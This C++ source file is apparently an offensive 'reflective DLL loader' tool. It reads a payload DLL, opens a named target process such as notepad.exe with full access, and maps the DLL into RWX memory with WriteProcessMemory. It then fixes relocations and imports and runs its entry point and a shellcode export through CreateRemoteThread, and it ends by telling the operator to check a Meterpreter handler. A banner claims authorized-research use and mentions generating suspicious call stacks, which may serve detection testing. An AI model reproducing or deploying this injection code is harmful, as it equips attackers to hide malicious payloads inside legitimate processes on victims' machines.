#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <vector>

class ReflectiveLoader {
private:
    std::vector<BYTE> dllData;
    HANDLE hProcess;
    LPVOID remoteImageBase;

public:
    ReflectiveLoader() : hProcess(nullptr), remoteImageBase(nullptr) {}

    ~ReflectiveLoader() {
        if (hProcess) CloseHandle(hProcess);
    }

    bool LoadDLL(const std::string& dllPath) {
        std::ifstream file(dllPath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            std::cerr << "[!] Failed to open DLL file: " << dllPath << std::endl;
            return false;
        }

        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);

        dllData.resize(size);
        if (!file.read(reinterpret_cast<char*>(dllData.data()), size)) {
            std::cerr << "[!] Failed to read DLL data" << std::endl;
            return false;
        }

        std::cout << "[+] Loaded DLL: " << dllPath << " (" << size << " bytes)" << std::endl;
        return true;
    }

    DWORD FindProcessByName(const std::string& processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            std::cerr << "[!] Failed to create process snapshot" << std::endl;
            return 0;
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(hSnapshot, &pe32)) {
            CloseHandle(hSnapshot);
            return 0;
        }

        do {
            if (processName == pe32.szExeFile) {
                CloseHandle(hSnapshot);
                std::cout << "[+] Found target process: " << processName << " (PID: " << pe32.th32ProcessID << ")" << std::endl;
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));

        CloseHandle(hSnapshot);
        std::cerr << "[!] Process not found: " << processName << std::endl;
        return 0;
    }

    bool OpenTargetProcess(DWORD pid) {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            std::cerr << "[!] Failed to open process (PID: " << pid << "). Error: " << GetLastError() << std::endl;
            return false;
        }
        std::cout << "[+] Opened target process with PID: " << pid << std::endl;
        return true;
    }

    bool ReflectivelyLoadDLL() {
        if (dllData.empty() || !hProcess) {
            std::cerr << "[!] DLL data or process handle not available" << std::endl;
            return false;
        }

        // Parse PE headers
        IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(dllData.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            std::cerr << "[!] Invalid DOS header" << std::endl;
            return false;
        }

        IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(dllData.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            std::cerr << "[!] Invalid NT header" << std::endl;
            return false;
        }

        DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;

        // Allocate memory in target process
        remoteImageBase = VirtualAllocEx(hProcess, nullptr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteImageBase) {
            std::cerr << "[!] Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
            return false;
        }

        std::cout << "[+] Allocated memory at: 0x" << std::hex << remoteImageBase << std::endl;

        // Copy headers
        if (!WriteProcessMemory(hProcess, remoteImageBase, dllData.data(), ntHeaders->OptionalHeader.SizeOfHeaders, nullptr)) {
            std::cerr << "[!] Failed to write PE headers" << std::endl;
            return false;
        }

        // Copy sections
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                LPVOID sectionDestination = static_cast<BYTE*>(remoteImageBase) + sectionHeader[i].VirtualAddress;
                LPVOID sectionSource = dllData.data() + sectionHeader[i].PointerToRawData;

                if (!WriteProcessMemory(hProcess, sectionDestination, sectionSource, sectionHeader[i].SizeOfRawData, nullptr)) {
                    std::cerr << "[!] Failed to write section: " << sectionHeader[i].Name << std::endl;
                    return false;
                }

                std::cout << "[+] Copied section: " << std::string(reinterpret_cast<char*>(sectionHeader[i].Name), 8) << std::endl;
            }
        }

        // Process relocations
        if (!ProcessRelocations(ntHeaders)) {
            std::cerr << "[!] Failed to process relocations" << std::endl;
            return false;
        }

        // Resolve imports
        if (!ResolveImports(ntHeaders)) {
            std::cerr << "[!] Failed to resolve imports" << std::endl;
            return false;
        }

        // Execute DLL entry point
        if (!ExecuteDLLMain(ntHeaders)) {
            std::cerr << "[!] Failed to execute DLL entry point" << std::endl;
            return false;
        }

        // Execute the VoidFunc export containing the shellcode and suspicious calls
        if (!ExecuteExportedFunction(ntHeaders, "VoidFunc")) {
            std::cerr << "[!] Failed to execute VoidFunc" << std::endl;
            return false;
        }

        std::cout << "[+] Successfully loaded DLL and executed VoidFunc!" << std::endl;
        return true;
    }

private:
    bool ProcessRelocations(IMAGE_NT_HEADERS* ntHeaders) {
        IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size == 0) {
            std::cout << "[+] No relocations needed" << std::endl;
            return true;
        }

        DWORD_PTR deltaImageBase = reinterpret_cast<DWORD_PTR>(remoteImageBase) - ntHeaders->OptionalHeader.ImageBase;
        if (deltaImageBase == 0) {
            std::cout << "[+] No relocations needed (loaded at preferred base)" << std::endl;
            return true;
        }

        std::vector<BYTE> relocData(relocDir.Size);
        SIZE_T bytesRead;
        if (!ReadProcessMemory(hProcess, static_cast<BYTE*>(remoteImageBase) + relocDir.VirtualAddress,
                              relocData.data(), relocDir.Size, &bytesRead)) {
            return false;
        }

        DWORD offset = 0;
        while (offset < relocDir.Size) {
            IMAGE_BASE_RELOCATION* relocation = reinterpret_cast<IMAGE_BASE_RELOCATION*>(relocData.data() + offset);
            if (relocation->VirtualAddress == 0) break;

            DWORD entriesCount = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entries = reinterpret_cast<WORD*>(relocation + 1);

            for (DWORD i = 0; i < entriesCount; i++) {
                WORD entry = entries[i];
                WORD type = entry >> 12;
                WORD relocOffset = entry & 0xFFF;

                if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
                    DWORD_PTR* patchAddress = reinterpret_cast<DWORD_PTR*>(
                        static_cast<BYTE*>(remoteImageBase) + relocation->VirtualAddress + relocOffset);

                    DWORD_PTR currentValue;
                    if (!ReadProcessMemory(hProcess, patchAddress, &currentValue, sizeof(currentValue), nullptr)) {
                        return false;
                    }

                    currentValue += deltaImageBase;

                    if (!WriteProcessMemory(hProcess, patchAddress, &currentValue, sizeof(currentValue), nullptr)) {
                        return false;
                    }
                }
            }

            offset += relocation->SizeOfBlock;
        }

        std::cout << "[+] Processed relocations (delta: 0x" << std::hex << deltaImageBase << ")" << std::endl;
        return true;
    }

    bool ResolveImports(IMAGE_NT_HEADERS* ntHeaders) {
        IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir.Size == 0) {
            std::cout << "[+] No imports to resolve" << std::endl;
            return true;
        }

        std::vector<BYTE> importData(importDir.Size);
        SIZE_T bytesRead;
        if (!ReadProcessMemory(hProcess, static_cast<BYTE*>(remoteImageBase) + importDir.VirtualAddress,
                              importData.data(), importDir.Size, &bytesRead)) {
            return false;
        }

        IMAGE_IMPORT_DESCRIPTOR* importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(importData.data());

        while (importDesc->Name != 0) {
            // Read module name
            std::vector<char> moduleName(256);
            if (!ReadProcessMemory(hProcess, static_cast<BYTE*>(remoteImageBase) + importDesc->Name,
                                  moduleName.data(), moduleName.size(), nullptr)) {
                return false;
            }

            HMODULE hModule = LoadLibraryA(moduleName.data());
            if (!hModule) {
                std::cerr << "[!] Failed to load library: " << moduleName.data() << std::endl;
                return false;
            }

            // Process import table
            DWORD_PTR* thunkData = reinterpret_cast<DWORD_PTR*>(static_cast<BYTE*>(remoteImageBase) + importDesc->FirstThunk);
            DWORD_PTR* originalThunk = reinterpret_cast<DWORD_PTR*>(static_cast<BYTE*>(remoteImageBase) +
                (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));

            for (int i = 0; ; i++) {
                DWORD_PTR thunkValue;
                if (!ReadProcessMemory(hProcess, &originalThunk[i], &thunkValue, sizeof(thunkValue), nullptr) ||
                    thunkValue == 0) {
                    break;
                }

                FARPROC functionAddress = nullptr;

                if (thunkValue & IMAGE_ORDINAL_FLAG) {
                    // Import by ordinal
                    functionAddress = GetProcAddress(hModule, MAKEINTRESOURCEA(thunkValue & 0xFFFF));
                } else {
                    // Import by name
                    std::vector<char> functionName(256);
                    if (ReadProcessMemory(hProcess, static_cast<BYTE*>(remoteImageBase) + thunkValue + 2,
                                         functionName.data(), functionName.size(), nullptr)) {
                        functionAddress = GetProcAddress(hModule, functionName.data());
                    }
                }

                if (!functionAddress) {
                    std::cerr << "[!] Failed to resolve import" << std::endl;
                    return false;
                }

                DWORD_PTR funcAddr = reinterpret_cast<DWORD_PTR>(functionAddress);
                if (!WriteProcessMemory(hProcess, &thunkData[i], &funcAddr, sizeof(funcAddr), nullptr)) {
                    return false;
                }
            }

            std::cout << "[+] Resolved imports for: " << moduleName.data() << std::endl;
            importDesc++;
        }

        return true;
    }

    bool ExecuteDLLMain(IMAGE_NT_HEADERS* ntHeaders) {
        DWORD entryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
        if (entryPoint == 0) {
            std::cout << "[+] No entry point to execute" << std::endl;
            return true;
        }

        LPVOID entryPointAddress = static_cast<BYTE*>(remoteImageBase) + entryPoint;

        // Create remote thread to execute DLL entry point
        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(entryPointAddress),
            remoteImageBase, 0, nullptr);

        if (!hThread) {
            std::cerr << "[!] Failed to create remote thread. Error: " << GetLastError() << std::endl;
            return false;
        }

        WaitForSingleObject(hThread, 5000); // Wait up to 5 seconds
        CloseHandle(hThread);

        std::cout << "[+] Executed DLL entry point at: 0x" << std::hex << entryPointAddress << std::endl;
        return true;
    }

    FARPROC GetExportedFunction(IMAGE_NT_HEADERS* ntHeaders, const std::string& functionName) {
        IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (exportDir.Size == 0) {
            std::cerr << "[!] No export table found" << std::endl;
            return nullptr;
        }

        std::vector<BYTE> exportData(exportDir.Size);
        SIZE_T bytesRead;
        if (!ReadProcessMemory(hProcess, static_cast<BYTE*>(remoteImageBase) + exportDir.VirtualAddress,
                              exportData.data(), exportDir.Size, &bytesRead)) {
            std::cerr << "[!] Failed to read export table" << std::endl;
            return nullptr;
        }

        IMAGE_EXPORT_DIRECTORY* exportTable = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(exportData.data());

        // Read function names array
        std::vector<DWORD> nameRVAs(exportTable->NumberOfNames);
        if (!ReadProcessMemory(hProcess, static_cast<BYTE*>(remoteImageBase) + exportTable->AddressOfNames,
                              nameRVAs.data(), nameRVAs.size() * sizeof(DWORD), nullptr)) {
            return nullptr;
        }

        // Read function addresses array
        std::vector<DWORD> functionRVAs(exportTable->NumberOfFunctions);
        if (!ReadProcessMemory(hProcess, static_cast<BYTE*>(remoteImageBase) + exportTable->AddressOfFunctions,
                              functionRVAs.data(), functionRVAs.size() * sizeof(DWORD), nullptr)) {
            return nullptr;
        }

        // Read ordinals array
        std::vector<WORD> ordinals(exportTable->NumberOfNames);
        if (!ReadProcessMemory(hProcess, static_cast<BYTE*>(remoteImageBase) + exportTable->AddressOfNameOrdinals,
                              ordinals.data(), ordinals.size() * sizeof(WORD), nullptr)) {
            return nullptr;
        }

        // Search for the function
        for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
            std::vector<char> currentName(256);
            if (!ReadProcessMemory(hProcess, static_cast<BYTE*>(remoteImageBase) + nameRVAs[i],
                                  currentName.data(), currentName.size(), nullptr)) {
                continue;
            }

            if (functionName == currentName.data()) {
                DWORD functionRVA = functionRVAs[ordinals[i]];
                LPVOID functionAddress = static_cast<BYTE*>(remoteImageBase) + functionRVA;
                std::cout << "[+] Found export: " << functionName << " at 0x" << std::hex << functionAddress << std::endl;
                return reinterpret_cast<FARPROC>(functionAddress);
            }
        }

        std::cerr << "[!] Export not found: " << functionName << std::endl;
        return nullptr;
    }

    bool ExecuteExportedFunction(IMAGE_NT_HEADERS* ntHeaders, const std::string& functionName) {
        FARPROC functionAddress = GetExportedFunction(ntHeaders, functionName);
        if (!functionAddress) {
            return false;
        }

        // Create remote thread to execute the exported function
        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(functionAddress),
            nullptr, 0, nullptr);

        if (!hThread) {
            std::cerr << "[!] Failed to create remote thread for " << functionName << ". Error: " << GetLastError() << std::endl;
            return false;
        }

        std::cout << "[+] Executing exported function: " << functionName << std::endl;
        std::cout << "[*] This will create suspicious call stack: <unknown> -> kernelbase -> ntdll" << std::endl;

        WaitForSingleObject(hThread, INFINITE); // Wait indefinitely for payload
        CloseHandle(hThread);

        return true;
    }
};

void PrintUsage() {
    std::cout << "Usage: reflective_loader_v2.exe <dll_path> <target_process_name>" << std::endl;
    std::cout << "Example: reflective_loader_v2.exe payload.dll notepad.exe" << std::endl;
}

int main(int argc, char* argv[]) {
    std::cout << "[*] Advanced Reflective DLL Loader v2" << std::endl;
    std::cout << "[*] Creates suspicious call stacks from unmapped memory" << std::endl;
    std::cout << "[*] For authorized security research and testing only" << std::endl;
    std::cout << "=================================" << std::endl;

    if (argc != 3) {
        PrintUsage();
        return 1;
    }

    std::string dllPath = argv[1];
    std::string processName = argv[2];

    ReflectiveLoader loader;

    // Load the DLL
    if (!loader.LoadDLL(dllPath)) {
        std::cerr << "[!] Failed to load DLL" << std::endl;
        return 1;
    }

    // Find target process
    DWORD pid = loader.FindProcessByName(processName);
    if (pid == 0) {
        std::cerr << "[!] Target process not found" << std::endl;
        return 1;
    }

    // Open target process
    if (!loader.OpenTargetProcess(pid)) {
        std::cerr << "[!] Failed to open target process" << std::endl;
        return 1;
    }

    // Perform reflective loading
    if (!loader.ReflectivelyLoadDLL()) {
        std::cerr << "[!] Reflective loading failed" << std::endl;
        return 1;
    }

    std::cout << "[+] Mission accomplished! Check your Meterpreter handler." << std::endl;
    return 0;
}